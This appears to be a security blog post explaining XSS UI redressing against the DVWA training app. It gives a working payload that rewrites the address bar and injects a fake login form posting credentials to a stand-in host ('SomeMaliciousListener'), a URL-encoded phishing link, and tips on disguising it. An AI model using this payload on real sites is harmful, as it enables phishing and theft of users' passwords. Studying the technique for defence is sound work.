<!doctype html><html lang=en>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-133811886-2')</script>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=x-ua-compatible content="IE=edge">
<script src=/js/nav.js></script>
<link rel="shortcut icon" href=/favicon.ico>
<link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous>
<link rel=stylesheet href=/css/main.css>
<title>
xss_ui_redressing | jellyparks
</title>
</head>
<body>
<header>
</header>
<div class=site-wrapper>
<div class="sticky top-bar">
<div id=mySidenav class=sidenav include-nav=/nav.html>
</div>
<span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span>
</div>
<div class=container>
<div class=blog-header>
<h1>xss_ui_redressing</h1>
</div>
<div class=row>
<div class="col-sm-8 blog-main">
<div class=blog-post>
<hr>
<h3 id=moving-beyond-alertxss>Moving Beyond alert(&lsquo;xss&rsquo;)</h3>
<p>Most people know all about making an alert box pop or getting a cookie sent to an external site with document.cookie. It makes since, it is easy to demo and for the most part makes for a great proof of concept.</p>
<p>Unfortunately these sometimes fail to showcase some of the more potentially devious outcomes from having a site that is vulnerable to XSS.</p>
<p>I recently came across a form of XSS that is called ui redressing. As I researched and learned more about it I came to see how malicious a XSS attack could be.</p>
<hr>
<h3 id=what-is-ui-redressing>What is UI Redressing?</h3>
<p>Redressing leverages features of html5 to call the history.replaceState or history.pushState functions to the browser. These functions allow a script to re-write what is presented in the URL bar after a page has loaded.</p>
<p>A script, rewrites the url presented in the address bar after loading the page. I&rsquo;ll let that sink in for a minute. I first came across this method randomly on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#ui-redressing>swisskeyrepo/PayloadsAllTheThings</a> xss injection GitHub page.</p>
<p>From the example on the swisskyrepo&rsquo;s page history.replaceState() is leveraged to replace the page with a /login.</p>
<p><em>Note: history.pushState() could also be used.</em></p>
<p>When the script is ran the url bar will be re-written from:</p>
<pre tabindex=0><code>http://dvwa/vulnerabilities/xss_r/?name=yogi#
</code></pre><p>to something a bit more devious:</p>
<pre tabindex=0><code>http://dvwa/login
</code></pre><p>So what? Whats the big deal, the url is re-written but the page is still the page it should be. Right? Maybe, unless the page gets changed with the document.body.innerHTML property&mldr;.</p>
<hr>
<h3 id=in-practice>In Practice</h3>
<p>Up until this point we have seen how UI redressing can be used to change the address bar. Let&rsquo;s leverage that and also re-write the html page to something a little bit more fitting of a login url. Using the script below we can change the URL to http://dvwa/login and also create a new html page for it with document.body.innerHTML.</p>
<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#2c5dcd;font-weight:700>script</span>&gt;
history.replaceState(<span style=color:#2c5dcd;font-weight:700>null</span>, <span style=color:#2c5dcd;font-weight:700>null</span>, <span style=color:#0c6>&#39;../../../login&#39;</span>);
<span style=color:#5918bb;font-weight:700>document</span>.body.innerHTML <span style=color:#2c5dcd>=</span> <span style=color:#0c6>&#34;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;h2&gt;Please login to acces
</span><span style=color:#0c6>s secure portion of our site.&lt;/h2&gt;&lt;form action=&#39;http://SomeMaliciousListener&#39;&gt;Usernam
</span><span style=color:#0c6>e: &lt;input type=&#39;text&#39;&gt;Password: &lt;input type=&#39;password&#39;&gt;&lt;input value=&#39;submit&#39; type=&#39;su
</span><span style=color:#0c6>bmit&#39;&gt;&lt;/form&gt;&#34;</span>
&lt;/<span style=color:#2c5dcd;font-weight:700>script</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>That&rsquo;s it. We can send a Phishing email with a url that is vulnerable to a reflected XSS and include that code as our payload.</p>
<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>http://dvwa/vulnerabilities/xss_r/?name=&lt;<span style=color:#2c5dcd;font-weight:700>script</span>&gt;history.replaceState(<span style=color:#2c5dcd;font-weight:700>null</span>, <span style=color:#2c5dcd;font-weight:700>null</span>, <span style=color:#0c6>&#39;../../../login&#39;</span>);<span style=color:#5918bb;font-weight:700>document</span>.body.innerHTML <span style=color:#2c5dcd>=</span> <span style=color:#0c6>&#34;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;h2&gt;Please login to access secure portion of our site.&lt;/h2&gt;&lt;form action=&#39;http://SomeMaliciousListener&#39;&gt;Username: &lt;input type=&#39;text&#39;&gt;Password: &lt;input type=&#39;password&#39;&gt;&lt;input value=&#39;submit&#39; type=&#39;submit&#39;&gt;&lt;/form&gt;&#34;</span>&lt;/<span style=color:#2c5dcd;font-weight:700>script</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>Even though the page that is expected to load looks similar to this:</p>
<p><img src=images/xssuiredressing1.png alt="UI Redressing 1" class=img-fluid></p>
<p>When the victim clicks the link the login page below will load:</p>
<p><img src=images/xssuiredressing2.png alt="UI Redressing 2" class=img-fluid></p>
<p>What about site certificates? It is not a problem. The victim is still on the real site. They are just at a destination that does not really exist except for them.</p>
<p>Wont they notice something weird about the url? Perhaps, I do not recommend sending a url that is full of html and javascript code. URL encoding it to something like this is much more favorable.</p>
<pre tabindex=0><code>http://dvwa/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%68%69%73%74%6f%72%79%2e%72%65%70%6c%61%63%65%53%74%61%74%65%28%6e%75%6c%6c%2c%20%6e%75%6c%6c%2c%20%27%2e%2e%2f%2e%2e%2f%2e%2e%2f%6c%6f%67%69%6e%27%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%20%3d%20%22%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%63%65%6e%74%65%72%3e%3c%68%32%3e%50%6c%65%61%73%65%20%6c%6f%67%69%6e%20%74%6f%20%61%63%63%65%73%73%20%73%65%63%75%72%65%20%70%6f%72%74%69%6f%6e%20%6f%66%20%6f%75%72%20%73%69%74%65%2e%3c%2f%68%32%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%53%6f%6d%65%4d%61%6c%69%63%69%6f%75%73%4c%69%73%74%65%6e%65%72%27%3e%55%73%65%72%6e%61%6d%65%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%27%74%65%78%74%27%3e%50%61%73%73%77%6f%72%64%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%27%70%61%73%73%77%6f%72%64%27%3e%3c%69%6e%70%75%74%20%76%61%6c%75%65%3d%27%73%75%62%6d%69%74%27%20%74%79%70%65%3d%27%73%75%62%6d%69%74%27%3e%3c%2f%66%6f%72%6d%3e%22%3c%2f%73%63%72%69%70%74%3e
</code></pre><p>This url looks much more &lsquo;official&rsquo;. I imagine most people would see this url and think: <em>&ldquo;oh, just your typical super long url, much be official. Let me check my training. Yup goes to the domain I expect, yup certificate is valid, must be a real site. Safe to login."</em> I think that the long url lends itself towards being perceived as more legitimate.</p>
</div>
</div>
<div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0>
<nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav>
<h5>contents</h5>
<ul class="nav post-sidenav">
<li><nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#moving-beyond-alertxss>Moving Beyond alert(&lsquo;xss&rsquo;)</a></li>
<li><a href=#what-is-ui-redressing>What is UI Redressing?</a></li>
<li><a href=#in-practice>In Practice</a></li>
</ul>
</li>
</ul>
</nav></li>
</ul>
</nav>
</div>
</div>
</div>
</div>
<footer>
</footer>
</body>
<script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
<script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js integrity=sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1 crossorigin=anonymous></script>
<script src=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js integrity=sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM crossorigin=anonymous></script>
<script>includeHTML()</script>
</html>